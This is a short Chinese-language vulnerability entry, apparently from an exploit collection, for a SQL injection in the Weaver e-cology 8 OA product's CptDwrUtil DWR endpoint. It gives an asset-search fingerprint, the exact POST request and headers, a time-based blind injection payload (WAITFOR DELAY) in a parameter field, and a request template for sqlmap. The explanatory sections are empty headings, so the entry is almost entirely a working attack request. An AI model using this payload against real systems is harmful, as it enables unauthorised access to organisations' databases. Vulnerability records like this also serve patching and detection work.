# 泛微E-cology8CptDwrUtil存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-cology OA"`
- **请求**：`POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 189`　`Content-Type: text/plain`

**请求体 / payload**
```
callCount=1&page=httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&batchId=0&c0-param1=string:1&c0-param0=string:1 WAITFOR DELAY '0:0:5'

sqlmap
POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Host: {hostname}
Content-Length: 189
Content-Type: text/plain
callCount=1&page=httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&batchId=0&c0-param1=string:1&c0-param0=string:1
```

**其他**
- 泛微E-cology 8 CptDwrUtil 存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-cology 8